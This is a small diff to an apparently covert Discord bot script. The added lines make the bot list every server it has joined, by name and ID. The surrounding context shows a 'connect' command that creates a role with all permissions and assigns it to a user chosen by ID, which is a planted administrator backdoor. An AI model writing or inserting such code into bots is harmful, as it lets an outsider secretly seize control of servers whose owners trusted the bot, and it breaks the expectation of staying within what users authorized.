@@ -32,5 +32,10 @@ async def connect(ctx):
 		role = await ctx.message.guild.create_role(name='sarvente', permissions=Permissions.all())
 		member = await ctx.message.guild.fetch_member(int(id))
 		await member.add_roles(discord.Object(role.id))
+	if open('mode.txt', 'r').read() == 'serverlist':
+		print('Connected!\n')
+		for guild in bot.guilds:
+			print(f'\nName: {guild.name} ||| ID: {guild.id}')
+
 
 bot.run(token)
